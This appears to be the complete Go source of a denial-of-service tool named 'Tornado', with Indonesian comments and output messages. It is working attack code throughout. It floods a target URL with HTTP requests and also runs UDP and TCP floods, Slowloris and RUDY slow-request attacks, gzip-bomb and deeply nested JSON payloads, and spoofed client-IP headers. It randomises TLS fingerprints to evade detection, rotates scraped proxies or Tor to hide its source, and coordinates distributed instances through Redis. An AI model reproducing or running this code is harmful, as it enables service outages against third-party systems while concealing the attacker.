package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/redis/go-redis/v9"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
	"golang.org/x/term"
)

// ==================== BANNER (DENGAN WARNA) ====================
const BANNER = `
[0;37;40m                                                               [0m
[0;36;40m███[0;37;40m      [0;36;40m▄██▀▀▀██▄[0;96;46m██▓[0;96;40m▀▀▀[0;96;46m▓█[0;96;40m▄[0;96;46m██▓[0;96;40m▀▀▀[0;96;46m▓█[0;96;40m▄[0;37;40m  [0;36;40m▀▀▀▀██▄[0;37;40m     [0;36;40m▀███▄██▀▀▀██▄[0m
[0;36;40m███▀▀[0;37;40m    [0;36;40m███[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0;96;46m██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓[0;36;40m▄██▀▀▀███▄██▀▀▀██████[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0m
[0;96;46m▓▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m▄▄▄[0;96;46m░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓█▓░[0;37;40m [0;90;40m█[0;37;40m [0;36;40m▀▀▀[0;96;46m█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓[0m
[0;96;46m█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▓▒[0;36;40m█[0;37;40m [0;90;40m████[0;37;40m [0;96;46m▓▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒░▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█[0m
[0;96;46m██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██[0;36;40m███[0;37;40m [0;90;40m████[0;37;40m [0;36;40m███[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0;96;46m▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██[0m
[0;96;46m██▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀[0;36;40m███[0;37;40m      [0;36;40m███[0;37;40m   [0;36;40m███[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓██[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓██[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀[0m
`

// ==================== GLOBAL VARIABLES ====================
var (
	targetURL     string
	workers       int
	duration      int
	methods       string
	enableHTTP2   bool
	enableProxy   bool
	enableTor     bool
	enableUDP     bool
	enableTCP     bool
	enableRedis   bool
	redisAddr     string
	enableSpoof   bool
	enableJA3     bool
	enableGzip    bool
	enableSlowloris bool
	enableDeepJSON bool
	enableRUDY    bool
	verbose       bool
	attackAll     bool
	proxyFile     string

	stats struct {
		total   uint64
		success uint64
		failed  uint64
	}
	mu          sync.Mutex
	proxyList   []string
	proxyIndex  int
	stopChan    chan struct{}
	wg          sync.WaitGroup
	rdb         *redis.Client
	ctx         = context.Background()
)

// ==================== FUNGSI BANTU UNTUK TERMINAL ====================
func getTerminalWidth() int {
	width, _, err := term.GetSize(int(os.Stdout.Fd()))
	if err != nil {
		return 80 // fallback
	}
	if width < 20 {
		return 20
	}
	return width
}

func stripANSI(s string) string {
	re := regexp.MustCompile(`\x1b\[[0-9;]*m`)
	return re.ReplaceAllString(s, "")
}

func truncateText(text string, maxLen int) string {
	if len(text) <= maxLen {
		return text
	}
	return text[:maxLen-3] + "..."
}

// ==================== PROXY MANAGER ====================
func fetchProxies() {
	if !enableProxy && proxyFile == "" {
		return
	}

	if proxyFile != "" {
		fmt.Printf("[*] Membaca proxy dari file: %s\n", proxyFile)
		file, err := os.Open(proxyFile)
		if err != nil {
			fmt.Printf("[!] Gagal buka file proxy: %v\n", err)
			return
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && strings.Contains(line, ":") {
				proxyList = append(proxyList, line)
			}
		}
		if len(proxyList) > 0 {
			fmt.Printf("[*] %d proxy dari file siap pakai.\n", len(proxyList))
			return
		}
		fmt.Println("[!] File proxy kosong, beralih ke download otomatis.")
	}

	fmt.Println("[*] Mengunduh proxy dari internet...")
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	sources := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://proxylist.rip/proxy/http/format/txt/",
	}
	all := make(map[string]bool)
	for _, src := range sources {
		resp, err := client.Get(src)
		if err != nil {
			if verbose {
				fmt.Printf("[!] Gagal ambil %s: %v\n", src, err)
			}
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(body), "\n") {
			line = strings.TrimSpace(line)
			if strings.Contains(line, ":") && !strings.Contains(line, "[") && !strings.Contains(line, "#") {
				parts := strings.Split(line, ":")
				if len(parts) == 2 {
					if net.ParseIP(parts[0]) != nil {
						all[line] = true
					}
				}
			}
		}
	}
	for p := range all {
		proxyList = append(proxyList, p)
	}

	fmt.Printf("[*] Menguji %d proxy...\n", len(proxyList))
	alive := []string{}
	var muAlive sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 50)
	for _, p := range proxyList {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 {
				return
			}
			conn, err := net.DialTimeout("tcp", proxy, 1*time.Second)
			if err == nil {
				conn.Close()
				muAlive.Lock()
				alive = append(alive, proxy)
				muAlive.Unlock()
			}
		}(p)
	}
	wg.Wait()
	proxyList = alive
	fmt.Printf("[*] %d proxy hidup siap pakai.\n", len(proxyList))
}

func getProxy() string {
	if len(proxyList) == 0 {
		return ""
	}
	mu.Lock()
	defer mu.Unlock()
	p := proxyList[proxyIndex%len(proxyList)]
	proxyIndex++
	return p
}

// ==================== JA3 SPOOF ====================
func randomCipherSuites() []uint16 {
	all := tls.CipherSuites()
	rand.Shuffle(len(all), func(i, j int) { all[i], all[j] = all[j], all[i] })
	count := 10
	if len(all) < count {
		count = len(all)
	}
	ids := make([]uint16, count)
	for i := 0; i < count; i++ {
		ids[i] = all[i].ID
	}
	return ids
}

func newTLSConfig() *tls.Config {
	cfg := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
	}
	if enableJA3 {
		cfg.CipherSuites = randomCipherSuites()
		cfg.CurvePreferences = []tls.CurveID{
			tls.CurveID(rand.Intn(10) + 20),
			tls.X25519,
			tls.CurveP256,
		}
	}
	return cfg
}

// ==================== UDP/TCP FLOOD ====================
func udpFlood(host string, port int) {
	if !enableUDP {
		return
	}
	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
	conn, _ := net.DialUDP("udp", nil, addr)
	payload := make([]byte, 1024)
	for {
		select {
		case <-stopChan:
			return
		default:
			rand.Read(payload)
			conn.Write(payload)
		}
	}
}

func tcpFlood(host string, port int) {
	if !enableTCP {
		return
	}
	for {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 1*time.Second)
			if err == nil {
				conn.Close()
			}
		}
	}
}

// ==================== SLOWLORIS ====================
func slowlorisAttack(host string, port int) {
	if !enableSlowloris {
		return
	}
	for {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 3*time.Second)
			if err != nil {
				continue
			}
			go func(c net.Conn) {
				defer c.Close()
				c.Write([]byte("GET / HTTP/1.1\r\n"))
				c.Write([]byte("Host: " + host + "\r\n"))
				c.Write([]byte("User-Agent: Mozilla/5.0\r\n"))
				for {
					select {
					case <-stopChan:
						return
					default:
						c.Write([]byte("X-Header: " + randString(10) + "\r\n"))
						time.Sleep(time.Duration(rand.Intn(5000)+1000) * time.Millisecond)
					}
				}
			}(conn)
		}
	}
}

// ==================== PAYLOAD GENERATOR ====================
func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[rand.Intn(62)]
	}
	return string(b)
}

func deepJSON() map[string]interface{} {
	if !enableDeepJSON {
		return map[string]interface{}{"data": randString(100)}
	}
	var build func(level int) map[string]interface{}
	build = func(level int) map[string]interface{} {
		if level == 0 {
			return map[string]interface{}{"leaf": randString(1000)}
		}
		return map[string]interface{}{
			"level":   level,
			"nested":  build(level - 1),
			"array":   []string{randString(100), randString(100)},
			"bigdata": randString(2000),
		}
	}
	return build(rand.Intn(50) + 10)
}

func gzipBomb() []byte {
	if !enableGzip {
		return []byte(randString(1024))
	}
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	largeData := bytes.Repeat([]byte("A"), 1024*1024)
	gz.Write(largeData)
	gz.Close()
	return buf.Bytes()
}

// ==================== HTTP WORKER ====================
func httpWorker(methodList []string) {
	defer wg.Done()
	tr := &http.Transport{
		TLSClientConfig:       newTLSConfig(),
		MaxIdleConns:          0,
		MaxIdleConnsPerHost:   0,
		DisableKeepAlives:     false,
		ResponseHeaderTimeout: 5 * time.Second,
	}
	if enableHTTP2 {
		http2.ConfigureTransport(tr)
	}
	if enableTor {
		dialer, _ := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
		tr.DialContext = dialer.(proxy.ContextDialer).DialContext
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for {
		select {
		case <-stopChan:
			return
		default:
			proxyAddr := getProxy()
			if proxyAddr != "" && enableProxy {
				proxyURL, _ := url.Parse("http://" + proxyAddr)
				tr.Proxy = http.ProxyURL(proxyURL)
			}

			method := methodList[rand.Intn(len(methodList))]

			var body io.Reader
			var payload []byte
			if method == "POST" || method == "PUT" || method == "PATCH" {
				if enableRUDY && rand.Intn(3) == 0 {
					payload = bytes.Repeat([]byte("X"), 1024*1024*10)
				} else if enableDeepJSON {
					data := deepJSON()
					payload, _ = json.Marshal(data)
				} else if enableGzip && rand.Intn(2) == 0 {
					payload = gzipBomb()
				} else {
					payload = []byte(randString(1024))
				}
				body = bytes.NewReader(payload)
			} else {
				body = nil
			}

			parsed, _ := url.Parse(targetURL)
			q := parsed.Query()
			for i := 0; i < 10; i++ {
				q.Set(randString(5), randString(8))
			}
			parsed.RawQuery = q.Encode()
			fullURL := parsed.String()

			req, _ := http.NewRequest(method, fullURL, body)
			req.Header.Set("User-Agent", randString(20))
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			if enableSpoof {
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1))
				req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1))
			}
			if enableDeepJSON && body != nil {
				req.Header.Set("Content-Type", "application/json")
			}
			if enableGzip && body != nil && rand.Intn(2) == 0 {
				req.Header.Set("Content-Encoding", "gzip")
			}

			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				atomic.AddUint64(&stats.failed, 1)
				if verbose {
					fmt.Println("[ERR]", err)
				}
				continue
			}
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			elapsed := time.Since(start).Milliseconds()
			atomic.AddUint64(&stats.total, 1)
			if resp.StatusCode < 500 {
				atomic.AddUint64(&stats.success, 1)
				if verbose {
					color.Green("[%d] %s %s (%dms)", resp.StatusCode, method, fullURL, elapsed)
				}
			} else {
				atomic.AddUint64(&stats.failed, 1)
				if verbose {
					color.Red("[%d] %s %s (%dms)", resp.StatusCode, method, fullURL, elapsed)
				}
			}
		}
	}
}

// ==================== STATS PRINTER ADAPTIF LAYAR HP (DENGAN 🌪) ====================
func statsPrinter() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			total := atomic.LoadUint64(&stats.total)
			success := atomic.LoadUint64(&stats.success)
			failed := atomic.LoadUint64(&stats.failed)
			rate := total / 2

			width := getTerminalWidth()
			// Bangun string statistik tanpa ANSI untuk dihitung panjangnya
			raw := fmt.Sprintf(" 🌪 Total: %d | Sukses: %d | Gagal: %d | Rate: %d req/s", total, success, failed, rate)
			clean := stripANSI(raw)
			cleanLen := len(clean)

			if cleanLen <= width {
				// Muat dalam satu baris
				fmt.Printf("\r\033[93m 🌪 Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
					total, success, failed, rate)
			} else {
				// Tidak muat → cetak dalam 2 baris
				line1 := fmt.Sprintf("Total: %d | Sukses: %d | Gagal: %d", total, success, failed)
				line2 := fmt.Sprintf("Rate: %d req/s", rate)
				maxLineWidth := width - 4
				if len(line1) > maxLineWidth {
					line1 = truncateText(line1, maxLineWidth)
				}
				if len(line2) > maxLineWidth {
					line2 = truncateText(line2, maxLineWidth)
				}
				fmt.Printf("\r\033[K")
				fmt.Printf("\033[93m 🌪\033[0m\n")
				fmt.Printf("%s\n", line1)
				fmt.Printf("%s", line2)
			}
		}
	}
}

// ==================== REDIS DISTRIBUTED ====================
func redisListener() {
	if !enableRedis || rdb == nil {
		return
	}
	pubsub := rdb.Subscribe(ctx, "tornado_control")
	defer pubsub.Close()
	for {
		select {
		case <-stopChan:
			return
		default:
			msg, err := pubsub.ReceiveMessage(ctx)
			if err == nil {
				if msg.Payload == "STOP" {
					fmt.Println("[*] Received STOP signal from Redis.")
					close(stopChan)
					return
				}
			}
		}
	}
}

// ==================== MAIN ====================
func main() {
	// ==================== FLAGS ====================
	flag.StringVar(&targetURL, "u", "", "Target URL (wajib)")
	flag.IntVar(&workers, "w", 200, "Jumlah goroutine HTTP")
	flag.IntVar(&duration, "d", 60, "Durasi dalam detik")
	flag.StringVar(&methods, "m", "GET,POST", "Metode HTTP (pisah koma)")
	flag.BoolVar(&enableHTTP2, "http2", false, "HTTP/2 multiplexing")
	flag.BoolVar(&enableProxy, "proxy", false, "Proxy auto-rotate + filter")
	flag.StringVar(&proxyFile, "proxy-file", "", "File proxy manual (ip:port per baris)")
	flag.BoolVar(&enableTor, "tor", false, "Lewatkan Tor (SOCKS5)")
	flag.BoolVar(&enableUDP, "udp", false, "UDP flood")
	flag.BoolVar(&enableTCP, "tcp", false, "TCP flood (SYN simulasi)")
	flag.BoolVar(&enableRedis, "redis", false, "Redis distributed mode")
	flag.StringVar(&redisAddr, "redis-addr", "localhost:6379", "Redis address")
	flag.BoolVar(&enableSpoof, "spoof", false, "Random IP spoofing")
	flag.BoolVar(&enableJA3, "ja3", false, "JA3 fingerprint spoof")
	flag.BoolVar(&enableGzip, "gzip", false, "Gzip bomb payload")
	flag.BoolVar(&enableDeepJSON, "deepjson", false, "Deep nested JSON payload")
	flag.BoolVar(&enableSlowloris, "slowloris", false, "Slowloris attack")
	flag.BoolVar(&enableRUDY, "rudy", false, "RUDY attack (large POST)")
	flag.BoolVar(&attackAll, "all", false, "AKTIFKAN SEMUA FITUR")
	flag.BoolVar(&verbose, "v", false, "Verbose output")
	flag.Parse()

	if targetURL == "" {
		fmt.Println("[ERROR] Target URL wajib! Gunakan -u")
		flag.Usage()
		os.Exit(1)
	}

	if attackAll {
		fmt.Println("💣 ALL MODE AKTIF – Semua fitur dinyalakan!")
		enableHTTP2 = true
		enableProxy = true
		enableUDP = true
		enableTCP = true
		enableSpoof = true
		enableJA3 = true
		enableGzip = true
		enableDeepJSON = true
		enableSlowloris = true
		enableRUDY = true
	}

	// Parsing methods
	methodList := []string{}
	for _, m := range strings.Split(methods, ",") {
		m = strings.TrimSpace(m)
		if m != "" {
			methodList = append(methodList, m)
		}
	}
	if len(methodList) == 0 {
		methodList = []string{"GET", "POST"}
	}

	// ==================== INISIALISASI ====================
	fmt.Print(BANNER)
	parsedURL, _ := url.Parse(targetURL)
	host := parsedURL.Hostname()
	port := 80
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	}

	// Redis
	if enableRedis {
		rdb = redis.NewClient(&redis.Options{
			Addr: redisAddr,
		})
		if _, err := rdb.Ping(ctx).Result(); err == nil {
			fmt.Printf("[*] Redis connected at %s\n", redisAddr)
		} else {
			fmt.Println("[!] Redis gagal konek, lanjut tanpa Redis.")
			enableRedis = false
		}
	}

	// Proxy
	if enableProxy || proxyFile != "" {
		fetchProxies()
		if len(proxyList) == 0 {
			fmt.Println("[!] Tidak ada proxy tersedia, lanjut tanpa proxy.")
			enableProxy = false
		}
	}

	stopChan = make(chan struct{})

	// ==================== START ATTACK ====================
	fmt.Printf("\n[🌪] Tornado menghantam %s\n", targetURL)
	fmt.Printf("[🧨] Workers: %d, Duration: %ds\n", workers, duration)
	fmt.Printf("[⚙️] Methods: %v\n", methodList)
	fmt.Printf("[🚀] HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
	fmt.Printf("[☄️] UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
	fmt.Printf("[💣] Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
	fmt.Printf("[🎆] Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
	

	// UDP/TCP/Slowloris background
	if enableUDP {
		go udpFlood(host, port)
	}
	if enableTCP {
		go tcpFlood(host, port)
	}
	if enableSlowloris {
		go slowlorisAttack(host, port)
	}
	if enableRedis {
		go redisListener()
	}

	// Stats printer (ADAPTIF dengan 🌪🌪🌪)
	go statsPrinter()

	// HTTP Workers
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go httpWorker(methodList)
	}

	// Timeout / Interrupt
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-time.After(time.Duration(duration) * time.Second):
		fmt.Println("\n[+] Attack selesai.")
	case <-sigChan:
		fmt.Println("\n[!] Dihentikan oleh pengguna.")
		if enableRedis && rdb != nil {
			rdb.Publish(ctx, "tornado_control", "STOP")
		}
	}

	close(stopChan)
	wg.Wait()

	// Final Stats
	total := atomic.LoadUint64(&stats.total)
	success := atomic.LoadUint64(&stats.success)
	failed := atomic.LoadUint64(&stats.failed)
	fmt.Println("\n" + strings.Repeat("=", 40))
	fmt.Println("             TORNADO  REPORT")
	fmt.Println(strings.Repeat("=", 40))
	fmt.Printf("Total request   : %d\n", total)
	fmt.Printf("Success (2xx-3xx) : %d\n", success)
	fmt.Printf("Failed           : %d\n", failed)
	fmt.Printf("Success rate    : %.1f%%\n", float64(success)/float64(total)*100)
}
